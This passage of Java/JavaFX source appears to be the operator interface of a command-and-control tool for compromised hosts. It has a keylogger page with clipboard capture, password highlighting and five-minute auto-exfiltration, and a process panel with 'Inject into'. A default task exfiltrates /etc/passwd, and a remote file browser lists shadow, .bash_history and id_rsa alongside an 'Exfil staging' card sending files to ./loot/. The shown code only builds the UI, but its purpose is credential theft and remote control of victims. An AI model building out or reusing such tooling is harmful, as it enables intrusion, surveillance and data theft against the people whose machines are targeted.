        CtrlBar.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent; -fx-border-width:0 0 1 0;");
        CtrlBar.setAlignment(Pos.CENTER_LEFT);

        ComboBox<String> SessCombo = new ComboBox<>();
        SessCombo.setPromptText("-- session --");
        StyleHelper.ApplyCombo(SessCombo);
        Button StartBtn = ComponentFactory.ActionButton("Start", "btn", "btn-success");
        Button StopBtn  = ComponentFactory.ActionButton("Stop",  "btn", "btn-danger");
        Button DumpBtn  = ComponentFactory.ActionButton("Dump",  "btn", "btn-accent");
        Button ClrBtn   = ComponentFactory.ActionButton("Clear", "btn", "btn-default");
        CtrlBar.getChildren().addAll(SessCombo, StartBtn, StopBtn, DumpBtn, ComponentFactory.FlexSpacer(true), ClrBtn);

        TextArea KlOut = new TextArea();
        KlOut.setEditable(false);
        VBox.setVgrow(KlOut, Priority.ALWAYS);
        StyleHelper.ApplyTerminal(KlOut);
        KlOut.setPromptText("Select session and press Start to capture keystrokes.");

        CaptureBody.getChildren().addAll(CtrlBar, KlOut);

        VBox CtlCard = ComponentFactory.PanelCard("Control", IconKey, Palette.AccentPurple);
        CtlCard.setPrefWidth(260);
        VBox CtlBody = ComponentFactory.GetPanelBody(CtlCard);
        CtlBody.getChildren().addAll(
            BuildSettingRow("Active",              ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Capture clipboard",   ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Highlight passwords", ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Auto-exfil 5 min",   ComponentFactory.BuildToggleSwitch()),
            StyleHelper.HorizontalDivider(),
            ComponentFactory.SmallCapsLabel("Captured credentials", Palette.TextTertiary),
            ComponentFactory.PlaceholderLabel("No credentials captured")
        );

        TwoCol.getChildren().addAll(CaptureCard, CtlCard);
        Page.getChildren().add(TwoCol);
        return Page;
    }

    public static VBox SysinfoPage() {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");
        Page.getChildren().add(BuildPageHeader("System Information", IconInfo, Palette.AccentGreen));

        HBox TwoCol = new HBox(10);
        TwoCol.setPadding(new Insets(12));
        VBox.setVgrow(TwoCol, Priority.ALWAYS);

        VBox SiCard = ComponentFactory.PanelCard("System details", IconInfo, Palette.AccentGreen);
        VBox SiBody = ComponentFactory.GetPanelBody(SiCard);
        HBox.setHgrow(SiCard, Priority.ALWAYS);

        HBox SelBar = new HBox(7);
        SelBar.setAlignment(Pos.CENTER_LEFT);
        ComboBox<String> SessCombo = new ComboBox<>();
        SessCombo.setPromptText("-- session --");
        StyleHelper.ApplyCombo(SessCombo);
        Button FetchBtn = ComponentFactory.ActionButton("Fetch", "btn", "btn-accent");
        SelBar.getChildren().addAll(SessCombo, FetchBtn);

        String[] SiKeys = {"Session", "Hostname", "OS", "User", "PID", "Arch", "RAM", "CPU", "Disk", "Uptime", "AV detected", "Firewall"};
        VBox SiRows = new VBox(0);
        for (String Key : SiKeys) {
            HBox Row = new HBox(10);
            Row.setPadding(new Insets(6, 0, 6, 0));
            Row.setStyle("-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent; -fx-border-width:0 0 1 0;");
            Row.setAlignment(Pos.CENTER_LEFT);
            Label Lbl = new Label(Key);
            Lbl.setMinWidth(90);
            Lbl.setStyle("-fx-text-fill:" + Palette.TextTertiary + "; -fx-font-size:11px;");
            Label Val = new Label("—");
            Val.setStyle("-fx-text-fill:" + Palette.TextPrimary + "; -fx-font-size:11px;");
            Row.getChildren().addAll(Lbl, Val);
            SiRows.getChildren().add(Row);
        }
        SiBody.getChildren().addAll(SelBar, StyleHelper.HorizontalDivider(), SiRows);

        VBox ProcCard = ComponentFactory.PanelCard("Process list", IconList, Palette.AccentGreen);
        ProcCard.setPrefWidth(300);
        VBox ProcBody = ComponentFactory.GetPanelBody(ProcCard);
        ProcBody.setPadding(new Insets(0));
        TextArea ProcOut = new TextArea();
        ProcOut.setEditable(false);
        VBox.setVgrow(ProcOut, Priority.ALWAYS);
        StyleHelper.ApplyTerminal(ProcOut);
        ProcOut.setPromptText("Fetch sysinfo to populate.");
        HBox ProcBtns = new HBox(5);
        ProcBtns.setPadding(new Insets(7, 10, 7, 10));
        ProcBtns.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-border-color:" + Palette.BorderSubtle + " transparent transparent transparent; -fx-border-width:1 0 0 0;");
        ProcBtns.getChildren().addAll(
            ComponentFactory.ActionButton("Kill selected", "btn", "btn-danger"),
            ComponentFactory.ActionButton("Inject into",   "btn", "btn-purple"),
            ComponentFactory.ActionButton("Refresh",       "btn", "btn-default")
        );
        ProcBody.getChildren().addAll(ProcOut, ProcBtns);

        TwoCol.getChildren().addAll(SiCard, ProcCard);
        Page.getChildren().add(TwoCol);
        return Page;
    }

    public static VBox TasksPage() {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");
        Page.getChildren().add(BuildPageHeader("Tasks", IconTask, Palette.AccentBlue));

        HBox TwoCol = new HBox(10);
        TwoCol.setPadding(new Insets(12));
        VBox.setVgrow(TwoCol, Priority.ALWAYS);

        VBox QueueCard = ComponentFactory.PanelCard("Task queue", IconTask, Palette.AccentBlue);
        VBox QueueBody = ComponentFactory.GetPanelBody(QueueCard);
        QueueBody.setPadding(new Insets(0));
        HBox.setHgrow(QueueCard, Priority.ALWAYS);

        VBox TaskList = new VBox(0);
        String[][] DefaultTasks = {
            {"Run sysinfo on all new sessions", "all"},
            {"Screenshot every 30 min on #2", "#2"},
            {"Exfil /etc/passwd from Linux hosts", "linux"}
        };
        for (String[] T : DefaultTasks) {
            HBox Row = new HBox(9);
            Row.setAlignment(Pos.CENTER_LEFT);
            Row.setPadding(new Insets(8, 10, 8, 10));
            Row.setStyle("-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent; -fx-border-width:0 0 1 0;");
            Label CheckBox = new Label();
            CheckBox.setPrefSize(14, 14);
            CheckBox.setStyle("-fx-border-color:" + Palette.BorderDefault + "; -fx-border-width:1; -fx-cursor:hand;");
            Label Desc = new Label(T[0]);
            Desc.setStyle("-fx-text-fill:" + Palette.TextPrimary + "; -fx-font-size:11px;");
            VBox.setVgrow(Desc, Priority.ALWAYS);
            Label Target = ComponentFactory.ChipLabel("target: " + T[1], "chip-orange");
            Label Status = ComponentFactory.ChipLabel("pending", "chip-orange");
            Button DelBtn = ComponentFactory.ActionButton("Del", "btn", "btn-danger");
            DelBtn.setOnAction(e -> { if (Row.getParent() instanceof VBox P) P.getChildren().remove(Row); });
            HBox.setHgrow(Desc, Priority.ALWAYS);
            Row.getChildren().addAll(CheckBox, Desc, Target, Status, DelBtn);
            TaskList.getChildren().add(Row);
        }
        HBox TaskActions = new HBox(5);
        TaskActions.setPadding(new Insets(7, 10, 7, 10));
        TaskActions.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-border-color:" + Palette.BorderSubtle + " transparent transparent transparent; -fx-border-width:1 0 0 0;");
        TaskActions.getChildren().addAll(
            ComponentFactory.ActionButton("+ Add task",  "btn", "btn-success"),
            ComponentFactory.ActionButton("Clear done",  "btn", "btn-default")
        );
        QueueBody.getChildren().addAll(TaskList, TaskActions);

        VBox NewTaskCard = ComponentFactory.PanelCard("New task", IconTask, Palette.AccentBlue);
        NewTaskCard.setPrefWidth(300);
        VBox NewTaskBody = ComponentFactory.GetPanelBody(NewTaskCard);
        TextField DescField = new TextField();
        DescField.setPromptText("Describe the task...");
        DescField.getStyleClass().add("input-field");
        ComboBox<String> TargetCombo = new ComboBox<>();
        TargetCombo.getItems().addAll("All sessions", "Linux sessions", "Windows sessions");
        TargetCombo.setValue("All sessions");
        StyleHelper.ApplyCombo(TargetCombo);
        TargetCombo.setMaxWidth(Double.MAX_VALUE);
        ComboBox<String> PrioCombo = new ComboBox<>();
        PrioCombo.getItems().addAll("Normal", "High", "Critical");
        PrioCombo.setValue("Normal");
        StyleHelper.ApplyCombo(PrioCombo);
        PrioCombo.setMaxWidth(Double.MAX_VALUE);
        NewTaskBody.getChildren().addAll(
            ComponentFactory.MutedLabel("Description"), DescField,
            ComponentFactory.MutedLabel("Target"), TargetCombo,
            ComponentFactory.MutedLabel("Priority"), PrioCombo,
            BuildSettingRow("Auto-execute", ComponentFactory.BuildToggleSwitch()),
            ComponentFactory.ActionButton("Add task", "btn", "btn-accent")
        );

        TwoCol.getChildren().addAll(QueueCard, NewTaskCard);
        Page.getChildren().add(TwoCol);
        return Page;
    }

    public static VBox SchedulerPage() {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");
        Page.getChildren().add(BuildPageHeader("Scheduler", IconTimer, Palette.AccentPurple));

        HBox TwoCol = new HBox(10);
        TwoCol.setPadding(new Insets(12));
        VBox.setVgrow(TwoCol, Priority.ALWAYS);

        VBox JobCard = ComponentFactory.PanelCard("Scheduled jobs", IconTimer, Palette.AccentPurple);
        VBox JobBody = ComponentFactory.GetPanelBody(JobCard);
        HBox.setHgrow(JobCard, Priority.ALWAYS);
        JobBody.setPadding(new Insets(0));
        Label NoJobs = ComponentFactory.PlaceholderLabel("No scheduled jobs. Add one below.");
        NoJobs.setPadding(new Insets(28, 0, 28, 12));
        JobBody.getChildren().add(NoJobs);
        HBox JobActions = new HBox(5);
        JobActions.setPadding(new Insets(7, 10, 7, 10));
        JobActions.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-border-color:" + Palette.BorderSubtle + " transparent transparent transparent; -fx-border-width:1 0 0 0;");
        JobActions.getChildren().addAll(
            ComponentFactory.ActionButton("Clear all",    "btn", "btn-danger"),
            ComponentFactory.ActionButton("Run all now",  "btn", "btn-accent")
        );
        JobCard.getChildren().add(JobActions);

        VBox NewJobCard = ComponentFactory.PanelCard("New scheduled job", IconTimer, Palette.AccentPurple);
        NewJobCard.setPrefWidth(300);
        VBox NewJobBody = ComponentFactory.GetPanelBody(NewJobCard);
        TextField JobNameField = new TextField();
        JobNameField.setPromptText("e.g. hourly screenshot");
        JobNameField.getStyleClass().add("input-field");
        TextField JobCmdField = new TextField();
        JobCmdField.setPromptText("e.g. screenshot <id>");
        JobCmdField.getStyleClass().add("input-field");
        ComboBox<String> IntervalCombo = new ComboBox<>();
        IntervalCombo.getItems().addAll("Every 1 min", "Every 5 min", "Every 30 min", "Every hour", "Daily");
        IntervalCombo.setValue("Every 30 min");
        StyleHelper.ApplyCombo(IntervalCombo);
        IntervalCombo.setMaxWidth(Double.MAX_VALUE);
        ComponentFactory.ToggleSwitch EnabledToggle = ComponentFactory.BuildToggleSwitch();
        EnabledToggle.SetSwitchedOn(true);
        NewJobBody.getChildren().addAll(
            ComponentFactory.MutedLabel("Job name"), JobNameField,
            ComponentFactory.MutedLabel("Command"),  JobCmdField,
            ComponentFactory.MutedLabel("Interval"), IntervalCombo,
            BuildSettingRow("Run on connect", ComponentFactory.BuildToggleSwitch()),
            BuildSettingRow("Enabled",        EnabledToggle),
            ComponentFactory.ActionButton("Add job", "btn", "btn-accent")
        );

        TwoCol.getChildren().addAll(JobCard, NewJobCard);
        Page.getChildren().add(TwoCol);
        return Page;
    }

    public static VBox FileManagerPage() {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");
        Page.getChildren().add(BuildPageHeader("File Manager", IconFolder, Palette.AccentYellow));

        HBox TwoCol = new HBox(10);
        TwoCol.setPadding(new Insets(12));
        VBox.setVgrow(TwoCol, Priority.ALWAYS);

        VBox BrowserCard = ComponentFactory.PanelCard("Remote file browser", IconFolder, Palette.AccentYellow);
        VBox BrowserBody = ComponentFactory.GetPanelBody(BrowserCard);
        BrowserBody.setPadding(new Insets(0));
        HBox.setHgrow(BrowserCard, Priority.ALWAYS);

        HBox NavBar = new HBox(6);
        NavBar.setAlignment(Pos.CENTER_LEFT);
        NavBar.setPadding(new Insets(6, 10, 6, 10));
        NavBar.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent; -fx-border-width:0 0 1 0;");
        Button UpBtn = ComponentFactory.ActionButton("..", "btn", "btn-default");
        Label PathLabel = new Label("/");
        PathLabel.setStyle("-fx-text-fill:" + Palette.TextSecondary + "; -fx-font-size:11px;");
        HBox.setHgrow(PathLabel, Priority.ALWAYS);
        ComboBox<String> SessCombo = new ComboBox<>();
        SessCombo.setPromptText("-- session --");
        StyleHelper.ApplyCombo(SessCombo);
        Button RefBtn = ComponentFactory.ActionButton("Refresh", "btn", "btn-default");
        NavBar.getChildren().addAll(UpBtn, PathLabel, SessCombo, RefBtn);

        VBox FileList = new VBox(0);
        String[][] Files = {
            {"D", "etc", "—", "2026-07-28"},
            {"D", "home", "—", "2026-07-29"},
            {"D", "var", "—", "2026-07-29"},
            {"F", "passwd", "2.1 KB", "2026-07-20"},
            {"F", "shadow", "1.4 KB", "2026-07-20"},
            {"F", ".bash_history", "8.7 KB", "2026-07-29"},
            {"F", "id_rsa", "3.3 KB", "2026-07-15"}
        };
        for (String[] F : Files) {
            HBox Row = new HBox(9);
            Row.setAlignment(Pos.CENTER_LEFT);
            Row.setPadding(new Insets(6, 10, 6, 10));
            Row.setStyle("-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent; -fx-border-width:0 0 1 0; -fx-cursor:hand;");
            Row.setOnMouseEntered(e -> Row.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-cursor:hand;"));
            Row.setOnMouseExited(e ->  Row.setStyle("-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent; -fx-border-width:0 0 1 0; -fx-cursor:hand;"));
            Label IcoLbl = new Label(F[0]);
            IcoLbl.setStyle("D".equals(F[0])
                ? "-fx-text-fill:" + Palette.AccentOrange + "; -fx-font-size:12px;"
                : "-fx-text-fill:" + Palette.TextSecondary + "; -fx-font-size:12px;");
            Label NameLbl = new Label(F[1]);
            NameLbl.setStyle("-fx-text-fill:" + Palette.TextPrimary + "; -fx-font-size:11px;");
            HBox.setHgrow(NameLbl, Priority.ALWAYS);
            Label SizeLbl = new Label(F[2]);
            SizeLbl.setStyle("-fx-text-fill:" + Palette.TextTertiary + "; -fx-font-size:10px; -fx-min-width:50;");
            Label DateLbl = new Label(F[3]);
            DateLbl.setStyle("-fx-text-fill:" + Palette.TextTertiary + "; -fx-font-size:10px; -fx-min-width:70; -fx-alignment:CENTER_RIGHT;");
            Row.getChildren().addAll(IcoLbl, NameLbl, SizeLbl, DateLbl);
            FileList.getChildren().add(Row);
        }
        HBox FileActions = new HBox(5);
        FileActions.setPadding(new Insets(7, 10, 7, 10));
        FileActions.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-border-color:" + Palette.BorderSubtle + " transparent transparent transparent; -fx-border-width:1 0 0 0;");
        FileActions.getChildren().addAll(
            ComponentFactory.ActionButton("Download sel", "btn", "btn-accent"),
            ComponentFactory.ActionButton("Upload",       "btn", "btn-default"),
            ComponentFactory.ActionButton("Delete",       "btn", "btn-danger")
        );
        BrowserBody.getChildren().addAll(NavBar, FileList, FileActions);

        VBox XferCard = ComponentFactory.PanelCard("Transfers", IconDownload, Palette.AccentYellow);
        XferCard.setPrefWidth(280);
        VBox XferBody = ComponentFactory.GetPanelBody(XferCard);
        Label NoXfer = ComponentFactory.PlaceholderLabel("No active transfers");
        NoXfer.setPadding(new Insets(22, 0, 22, 0));
        XferBody.getChildren().add(NoXfer);
        HBox XferActions = new HBox(5);
        XferActions.setPadding(new Insets(7, 10, 7, 10));
        XferActions.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-border-color:" + Palette.BorderSubtle + " transparent transparent transparent; -fx-border-width:1 0 0 0;");
        XferActions.getChildren().addAll(
            ComponentFactory.ActionButton("Cancel all", "btn", "btn-danger"),
            ComponentFactory.ActionButton("Clear done", "btn", "btn-default")
        );
        XferCard.getChildren().add(XferActions);

        VBox ExfilCard = ComponentFactory.PanelCard("Exfil staging", IconDownload, Palette.AccentOrange);
        VBox ExfilBody = ComponentFactory.GetPanelBody(ExfilCard);
        TextField SrcField = new TextField("/tmp/.cache");
        TextField DstField = new TextField("./loot/");
        SrcField.getStyleClass().add("input-field");
        DstField.getStyleClass().add("input-field");
        ExfilBody.getChildren().addAll(
            ComponentFactory.MutedLabel("Source (remote)"), SrcField,
            ComponentFactory.MutedLabel("Destination (local)"), DstField,
            ComponentFactory.ActionButton("Start exfil", "btn", "btn-accent")
        );

        VBox RightCol = new VBox(10);
        RightCol.getChildren().addAll(XferCard, ExfilCard);
        TwoCol.getChildren().addAll(BrowserCard, RightCol);
        Page.getChildren().add(TwoCol);
        return Page;
    }

    public static VBox NetworkMapPage() {
        VBox Page = new VBox(0);
        Page.setStyle("-fx-background-color:" + Palette.Background + ";");
        Page.getChildren().add(BuildPageHeader("Network Map", IconNet, Palette.AccentTeal));

        VBox Inner = new VBox(10);
        Inner.setPadding(new Insets(12));
        VBox.setVgrow(Inner, Priority.ALWAYS);

        VBox MapCard = ComponentFactory.PanelCard("Network topology", IconNet, Palette.AccentTeal);
        VBox MapBody = ComponentFactory.GetPanelBody(MapCard);
        MapBody.setPadding(new Insets(0));

        javafx.scene.canvas.Canvas MapCanvas = new javafx.scene.canvas.Canvas(600, 200);
        javafx.scene.canvas.GraphicsContext Gc = MapCanvas.getGraphicsContext2D();
        Gc.setFill(javafx.scene.paint.Color.web(Palette.BackgroundVoid));
        Gc.fillRect(0, 0, 600, 200);
        Gc.setStroke(javafx.scene.paint.Color.web(Palette.BorderSubtle));
        Gc.setLineWidth(1);
        Gc.strokeRect(10, 80, 60, 28);
        Gc.setFill(javafx.scene.paint.Color.web(Palette.AccentBlue));
        Gc.fillText("C2", 32, 98);

        StackPane CanvasPane = new StackPane(MapCanvas);
        CanvasPane.setStyle("-fx-background-color:" + Palette.BackgroundVoid + ";");
        CanvasPane.setAlignment(Pos.CENTER);

        HBox MapActions = new HBox(5);
        MapActions.setPadding(new Insets(7, 10, 7, 10));
        MapActions.setStyle("-fx-background-color:" + Palette.BackgroundPanel + "; -fx-border-color:" + Palette.BorderSubtle + " transparent transparent transparent; -fx-border-width:1 0 0 0;");
        MapActions.getChildren().addAll(
            ComponentFactory.ActionButton("Redraw", "btn", "btn-accent"),
            ComponentFactory.ActionButton("+ Add node", "btn", "btn-default")
        );
        MapBody.getChildren().addAll(CanvasPane, MapActions);

        HBox TwoCol = new HBox(10);
        VBox DetailCard = ComponentFactory.PanelCard("Node detail", IconInfo, Palette.TextTertiary);
        VBox DetailBody = ComponentFactory.GetPanelBody(DetailCard);
        DetailBody.getChildren().add(ComponentFactory.PlaceholderLabel("Select a node to view details."));
        HBox.setHgrow(DetailCard, Priority.ALWAYS);

        VBox HostCard = ComponentFactory.PanelCard("Discovered hosts", IconNet, Palette.AccentTeal);
        HostCard.setPrefWidth(320);
        VBox HostBody = ComponentFactory.GetPanelBody(HostCard);
        HostBody.setPadding(new Insets(0));
        String[][] Hosts = {
            {"10.0.0.1", "online", "Gateway"},
            {"10.0.0.10", "agent", "Win Server 2022"},
            {"10.0.0.23", "shell", "Ubuntu 22.04"},
            {"10.0.0.88", "online", "File server"},
            {"172.16.5.1", "unknown", "Subnet GW"}
        };
        for (String[] H : Hosts) {
            HBox Row = new HBox(9);
            Row.setAlignment(Pos.CENTER_LEFT);
            Row.setPadding(new Insets(6, 10, 6, 10));
            Row.setStyle("-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent; -fx-border-width:0 0 1 0;");
            Label Ip = new Label(H[0]);
            Ip.setStyle("-fx-text-fill:" + Palette.TextPrimary + "; -fx-font-size:11px; -fx-min-width:100;");
            String ChipCls = switch (H[1]) {
                case "agent" -> "chip-blue";
                case "shell" -> "chip-orange";
                case "online" -> "chip-green";
                default -> "chip-orange";
            };
            Label Status = ComponentFactory.ChipLabel(H[1], ChipCls);
            Label Info = new Label(H[2]);
            Info.setStyle("-fx-text-fill:" + Palette.TextTertiary + "; -fx-font-size:11px;");
            Row.getChildren().addAll(Ip, Status, Info);
            HostBody.getChildren().add(Row);
        }
        TwoCol.getChildren().addAll(DetailCard, HostCard);
        Inner.getChildren().addAll(MapCard, TwoCol);
        Page.getChildren().add(Inner);
        return Page;
    }

    private static HBox BuildPageHeader(String Title, String IconCodepoint, String AccentHex) {
        HBox Header = new HBox(9);
        Header.setAlignment(Pos.CENTER_LEFT);
        Header.setPadding(new Insets(7, 12, 7, 12));
        Header.setStyle(
            "-fx-background-color:" + Palette.BackgroundDeep + ";" +
            "-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent;" +
            "-fx-border-width:0 0 1 0;"
        );
        Header.getChildren().addAll(
            ComponentFactory.IconChip(IconCodepoint, AccentHex, 26, 13),
            ComponentFactory.SmallCapsLabel(Title, Palette.TextSecondary)
        );
        return Header;
    }

    private static HBox BuildSettingRow(String Label, Node Control) {
        HBox Row = new HBox(10);
        Row.setAlignment(Pos.CENTER_LEFT);
        Row.setPadding(new Insets(6, 0, 6, 0));
        Row.setStyle("-fx-border-color:transparent transparent " + Palette.BorderSubtle + " transparent; -fx-border-width:0 0 1 0;");
        Label Lbl = new Label(Label);
        Lbl.setStyle("-fx-text-fill:" + Palette.TextSecondary + "; -fx-font-size:11px;");
        HBox.setHgrow(Lbl, Priority.ALWAYS);
        Row.getChildren().addAll(Lbl, Control);
        return Row;
    }
}
